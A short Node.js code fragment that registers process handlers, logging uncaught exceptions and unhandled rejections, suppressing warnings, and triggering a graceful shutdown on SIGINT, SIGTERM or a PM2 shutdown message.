// ========== PROCESS HANDLERS ==========
process.on("uncaughtException", (err) => {
  console.error('Uncaught Exception:', err);
});
process.on("unhandledRejection", (err) => {
  console.error('Unhandled Rejection:', err);
});
process.removeAllListeners("warning");
process.once('SIGINT', () => gracefulShutdown('SIGINT'));
process.once('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('message', (msg) => {
  if (msg === 'shutdown') gracefulShutdown('PM2_SHUTDOWN');
});
